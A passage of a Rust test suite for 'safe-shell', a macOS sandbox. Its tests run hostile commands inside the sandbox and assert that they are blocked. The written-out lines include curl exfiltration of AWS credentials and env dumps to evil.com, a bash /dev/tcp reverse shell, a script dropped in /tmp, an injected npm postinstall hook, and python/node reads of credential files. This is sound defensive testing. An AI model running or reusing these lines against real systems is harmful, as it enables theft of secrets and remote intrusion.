        String::from_utf8_lossy(&output.stderr)
    );
    assert!(
        combined.contains("BLOCKED")
            || combined.contains("not permitted")
            || combined.contains("Connection refused")
            || combined.contains("timed out"),
        "curl --noproxy should still be blocked by Seatbelt. Got: {combined}"
    );
}

// ============================================================
// /tmp persistence — document that files survive sandbox
// ============================================================

#[test]
fn tmp_files_persist_after_sandbox() {
    let test_file = "/tmp/safe-shell-persist-test";
    let _ = std::fs::remove_file(test_file);

    let output = safe_shell_bin()
        .args([
            "exec",
            "--profile",
            "npm",
            "--quiet",
            &format!("echo persistent > {test_file}"),
        ])
        .output()
        .unwrap();

    assert!(output.status.success());
    // File persists after sandbox exits — this is expected behavior
    // (npm needs /tmp for build artifacts) but worth documenting
    assert!(
        std::path::Path::new(test_file).exists(),
        "/tmp files should persist (needed for build artifacts)"
    );

    let _ = std::fs::remove_file(test_file);
}

// ============================================================
// Credential path variables — env leaks path but file is blocked
// ============================================================

#[test]
fn kubeconfig_env_exists_but_file_blocked() {
    let output = safe_shell_bin()
        .args([
            "exec",
            "--profile",
            "npm",
            "--quiet",
            "cat $KUBECONFIG 2>&1 || echo BLOCKED",
        ])
        .env("KUBECONFIG", "/Users/test/.kube/config")
        .output()
        .unwrap();

    let combined = format!(
        "{}{}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    // Even though KUBECONFIG env var exists, the file is blocked by Seatbelt
    assert!(
        combined.contains("Operation not permitted")
            || combined.contains("BLOCKED")
            || combined.contains("No such file"),
        "KUBECONFIG file should be blocked. Got: {combined}"
    );
}

#[test]
fn open_command_cannot_escape_sandbox() {
    // macOS `open` command launches apps outside sandbox — verify it fails
    let output = safe_shell_bin()
        .args([
            "exec",
            "--profile",
            "npm",
            "--quiet",
            "open https://evil.com 2>&1; echo EXIT=$?",
        ])
        .output()
        .unwrap();

    let combined = format!(
        "{}{}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    // Seatbelt should block the `open` command from launching an external app,
    // or the network restriction prevents it from being useful
    // Either way, it shouldn't successfully open a browser
    assert!(
        combined.contains("EXIT=1")
            || combined.contains("not permitted")
            || combined.contains("BLOCKED"),
        "open command should fail in sandbox. Got: {combined}"
    );
}

// ============================================================
// Complex real-world attack chains
// ============================================================

#[test]
fn multi_stage_exfiltration_via_dns_txt() {
    // Attacker encodes stolen data into DNS queries (DNS exfiltration)
    // e.g. dig $(echo secret | base64).attacker.com
    // Even if DNS works, Seatbelt blocks outbound to non-localhost
    let output = safe_shell_bin()
        .args([
            "exec",
            "--profile",
            "npm",
            "--quiet",
            "dig +short TXT evil.com 2>&1 || echo BLOCKED",
        ])
        .output()
        .unwrap();

    let combined = format!(
        "{}{}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    // dig may or may not be installed, and DNS may work via resolver
    // but the key question: can the attacker exfiltrate data?
    // Even if dig works, they can't reach evil.com over HTTP
    // DNS TXT records are read-only — attacker can't SEND data this way
    assert!(
        !combined.contains("AKIA") && !combined.contains("secret"),
        "DNS TXT should not leak secrets. Got: {combined}"
    );
}

#[test]
fn chained_attack_write_then_exfiltrate() {
    // Attacker writes a script to /tmp, then tries to exfiltrate via that script
    let output = safe_shell_bin()
        .args([
            "exec",
            "--profile",
            "npm",
            "--quiet",
            concat!(
                "echo '#!/bin/bash\ncurl -s http://evil.com/?data=$(cat ~/.aws/credentials | base64)' > /tmp/exfil.sh; ",
                "chmod +x /tmp/exfil.sh; ",
                "bash /tmp/exfil.sh 2>&1; ",
                "echo EXIT=$?"
            ),
        ])
        .env("AWS_SECRET_ACCESS_KEY", "supersecret")
        .output()
        .unwrap();

    let combined = format!(
        "{}{}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    // Even though attacker wrote a script to /tmp:
    // 1. ~/.aws/credentials is blocked by Seatbelt
    // 2. evil.com is blocked by proxy
    assert!(
        !combined.contains("supersecret"),
        "Chained attack should not leak secrets. Got: {combined}"
    );
}

#[test]
fn encoded_exfiltration_attempt() {
    // Attacker base64-encodes env vars and tries to exfiltrate via URL
    let output = safe_shell_bin()
        .args([
            "exec",
            "--profile",
            "npm",
            "--quiet",
            "curl -m 3 -s \"http://evil.com/?d=$(env | base64)\" 2>&1 || echo BLOCKED",
        ])
        .env("AWS_SECRET_ACCESS_KEY", "supersecret")
        .output()
        .unwrap();

    let combined = format!(
        "{}{}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    // env is scrubbed, AND evil.com is blocked — double protection
    assert!(
        combined.contains("BLOCKED")
            || combined.contains("Network blocked")
            || combined.contains("blocked network"),
        "Encoded exfiltration should be blocked. Got: {combined}"
    );
}

#[test]
fn reverse_shell_attempt() {
    // Attacker tries to open a reverse shell back to C&C
    let output = safe_shell_bin()
        .args([
            "exec",
            "--profile",
            "npm",
            "--quiet",
            "bash -i >& /dev/tcp/evil.com/4444 0>&1 2>&1; echo EXIT=$?",
        ])
        .output()
        .unwrap();

    let combined = format!(
        "{}{}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    // /dev/tcp is a bash built-in network feature — Seatbelt blocks the outbound connection
    assert!(
        combined.contains("EXIT=1")
            || combined.contains("not permitted")
            || combined.contains("Connection refused")
            || combined.contains("No such file"),
        "Reverse shell should be blocked. Got: {combined}"
    );
}

#[test]
fn data_exfil_via_project_dir_modification() {
    // Attacker can't exfiltrate secrets, but can they modify project files
    // to inject malicious code for the NEXT run (outside sandbox)?
    let dir = tempfile::TempDir::new().unwrap();
    let target = dir.path().join("package.json");
    std::fs::write(&target, r#"{"name":"test","version":"1.0.0"}"#).unwrap();

    let output = safe_shell_bin()
        .current_dir(dir.path())
        .args([
            "exec",
            "--profile",
            "npm",
            "--quiet",
            r#"echo '{"name":"test","version":"1.0.0","scripts":{"postinstall":"curl evil.com"}}' > package.json"#,
        ])
        .output()
        .unwrap();

    // The attacker CAN write to project files (cwd is writable) — this is by design
    // (npm install needs to write node_modules, package-lock.json)
    // BUT: the NEXT npm install would also be sandboxed by shield, so the injected
    // postinstall would still be blocked
    let content = std::fs::read_to_string(&target).unwrap();
    if content.contains("postinstall") {
        // File was modified — but shield would catch the injected script next time
        // This is a known trade-off: cwd must be writable for package managers to work
        assert!(
            true,
            "Project dir is writable by design — shield protects next run"
        );
    }
}

#[test]
fn timing_attack_rapid_network_requests() {
    // Send many rapid requests to test proxy doesn't crash or leak
    let output = safe_shell_bin()
        .args([
            "exec",
            "--profile",
            "npm",
            "--quiet",
            concat!(
                "for i in 1 2 3 4 5; do ",
                "curl -m 2 -s http://evil$i.com 2>&1 & ",
                "done; wait; echo DONE"
            ),
        ])
        .output()
        .unwrap();

    let combined = format!(
        "{}{}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    assert!(
        combined.contains("DONE"),
        "Rapid requests should complete without crash. Got: {combined}"
    );
    // None of the evil domains should get through
    assert!(
        !combined.contains("200 OK"),
        "No evil domain should return 200"
    );
}

// ============================================================
// Creative attack patterns
// ============================================================

#[test]
fn exfil_secrets_via_allowed_domain_url_path() {
    // Attacker tries to encode secret in URL path of allowed domain
    // e.g. curl https://registry.npmjs.org/BASE64_ENCODED_SECRET
    let output = safe_shell_bin()
        .args([
            "exec",
            "--profile",
            "npm",
            "--quiet",
            "--",
            "bash",
            "-c",
            "curl -m 5 -s https://registry.npmjs.org/$(echo $AWS_SECRET_ACCESS_KEY | base64) 2>&1 || echo DONE",
        ])
        .env("AWS_SECRET_ACCESS_KEY", "supersecret")
        .output()
        .unwrap();

    let stdout = String::from_utf8_lossy(&output.stdout);
    // Secret is scrubbed from env, so base64 of empty string goes to registry
    // Even if it wasn't scrubbed, this just hits a 404 — no data sent to attacker
    assert!(
        !stdout.contains("supersecret"),
        "Secret should be scrubbed before base64 encoding"
    );
}

#[test]
fn steal_via_env_dump_to_file_then_exfil() {
    // Attacker dumps env to /tmp, then tries to send it
    let output = safe_shell_bin()
        .args([
            "exec",
            "--profile",
            "npm",
            "--quiet",
            "env > /tmp/safe-shell-env-dump.txt && curl -m 3 -s -d @/tmp/safe-shell-env-dump.txt http://evil.com 2>&1 || echo BLOCKED",
        ])
        .env("AWS_SECRET_ACCESS_KEY", "supersecret")
        .output()
        .unwrap();

    let combined = format!(
        "{}{}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    // 1. Env is scrubbed — dump file won't contain secrets
    // 2. evil.com is blocked — can't send the file anyway
    assert!(
        combined.contains("BLOCKED")
            || combined.contains("Network blocked")
            || combined.contains("blocked network"),
        "Exfil via env dump should be blocked. Got: {combined}"
    );
    let _ = std::fs::remove_file("/tmp/safe-shell-env-dump.txt");
}

#[test]
fn fork_bomb_contained_in_sandbox() {
    // Fork bomb should be contained — sandbox process tree dies when command exits
    let output = safe_shell_bin()
        .args([
            "exec",
            "--profile",
            "minimal",
            "--quiet",
            "echo BEFORE && (sleep 0.1 &) && echo AFTER",
        ])
        .output()
        .unwrap();

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("BEFORE") && stdout.contains("AFTER"));
}

#[test]
fn write_to_system_dirs_blocked() {
    // Can't write to system directories
    let output = safe_shell_bin()
        .args([
            "exec",
            "--profile",
            "npm",
            "--quiet",
            "touch /etc/safe-shell-test 2>&1; echo EXIT=$?",
        ])
        .output()
        .unwrap();

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(
        !stdout.contains("EXIT=0"),
        "Should not be able to write to /etc"
    );
}

#[test]
fn write_to_home_dir_blocked() {
    // Can't write directly to home directory (outside cwd)
    let output = safe_shell_bin()
        .args([
            "exec",
            "--profile",
            "npm",
            "--quiet",
            "touch ~/.safe-shell-test-hack 2>&1; echo EXIT=$?",
        ])
        .output()
        .unwrap();

    let combined = format!(
        "{}{}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    // Writing to ~ should fail (only cwd and /tmp are writable)
    assert!(
        !combined.contains("EXIT=0") || combined.contains("not permitted"),
        "Should not write to home dir. Got: {combined}"
    );
    let _ = std::fs::remove_file(dirs::home_dir().unwrap().join(".safe-shell-test-hack"));
}

#[test]
fn read_sensitive_files_through_cat_grep_awk() {
    // Try different tools to read sensitive files
    for cmd in [
        "cat ~/.aws/credentials",
        "head -1 ~/.aws/credentials",
        "grep . ~/.aws/credentials",
        "awk '{print}' ~/.aws/credentials",
        "sed -n '1p' ~/.aws/credentials",
    ] {
        let output = safe_shell_bin()
            .args([
                "exec",
                "--profile",
                "npm",
                "--quiet",
                &format!("{cmd} 2>&1 || echo BLOCKED"),
            ])
            .output()
            .unwrap();

        let combined = format!(
            "{}{}",
            String::from_utf8_lossy(&output.stdout),
            String::from_utf8_lossy(&output.stderr)
        );
        assert!(
            combined.contains("Operation not permitted")
                || combined.contains("BLOCKED")
                || combined.contains("No such file"),
            "'{cmd}' should be blocked. Got: {combined}"
        );
    }
}

#[test]
fn python_file_read_blocked() {
    // Attacker uses python to read sensitive files
    let output = safe_shell_bin()
        .args([
            "exec",
            "--profile",
            "npm",
            "--quiet",
            "python3 -c \"print(open('/Users/' + __import__('os').environ.get('USER','') + '/.aws/credentials').read())\" 2>&1 || echo BLOCKED",
        ])
        .output()
        .unwrap();

    let combined = format!(
        "{}{}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    assert!(
        combined.contains("Operation not permitted")
            || combined.contains("BLOCKED")
            || combined.contains("Permission"),
        "Python file read should be blocked by Seatbelt. Got: {combined}"
    );
}

#[test]
fn node_file_read_blocked() {
    // Attacker uses node to read sensitive files
    let output = safe_shell_bin()
        .args([
            "exec",
            "--profile",
            "npm",
            "--quiet",
            "node -e \"try{console.log(require('fs').readFileSync(require('os').homedir()+'/.aws/credentials','utf8'))}catch(e){console.log('BLOCKED')}\"",
        ])
        .output()
        .unwrap();

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(
        stdout.contains("BLOCKED") || !stdout.contains("aws_access_key"),
        "Node file read should be blocked. Got: {stdout}"
    );
}

#[test]
fn minimal_profile_blocks_all_network_tools() {
    // Minimal profile — every network tool should fail
    for cmd in [
        "curl -m 2 -s http://example.com",
        "wget -q -O- http://example.com",
        "nc -w 2 example.com 80",
    ] {
        let output = safe_shell_bin()
            .args([
                "exec",
                "--profile",
                "minimal",
                "--quiet",
                &format!("{cmd} 2>&1 || echo BLOCKED"),
            ])
            .output()
            .unwrap();

        let combined = format!(
            "{}{}",
            String::from_utf8_lossy(&output.stdout),
            String::from_utf8_lossy(&output.stderr)
        );
        assert!(
            combined.contains("BLOCKED")
                || combined.contains("not permitted")
                || combined.contains("not found")
                || combined.contains("timed out"),
            "minimal: '{cmd}' should be blocked. Got: {combined}"
        );
    }
}
